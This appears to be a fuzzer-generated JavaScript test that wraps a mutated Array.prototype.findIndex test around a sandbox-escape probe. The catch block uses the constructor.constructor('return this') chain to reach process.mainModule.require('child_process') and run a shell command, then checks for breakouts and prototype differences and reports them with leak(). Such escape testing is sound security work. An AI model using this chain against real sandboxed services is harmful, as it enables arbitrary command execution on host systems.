try {
    var arr = [
        'Shoes',
        'Car',
        'Bike'
    ];
    var results = [];
    arr.findIndex(function (kValue) {
        throw () => {
            return () => {
            };
        };
        if (results.length === 0) {
            arr.splice(1, 1);
        }
        results.push(kValue);
    });
    assert.sameValue(results.length, 3, 'predicate called three times');
    assert.sameValue(results[0], 'Shoes');
    assert.sameValue(results[1], 'Bike');
    assert.sameValue(results[2], undefined);
    results = [];
    arr = [
        'Skateboard',
        'Barefoot'
    ];
    arr.findIndex(function (kValue) {
        if (results.length === 0) {
            arr.push('Motorcycle');
            arr[1] = 'Magic Carpet';
        }
        results.push(kValue);
    });
    assert.sameValue(results.length, 2, 'predicate called twice');
    assert.sameValue(results[0], 'Skateboard');
    assert.sameValue(results[1], 'Magic Carpet');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}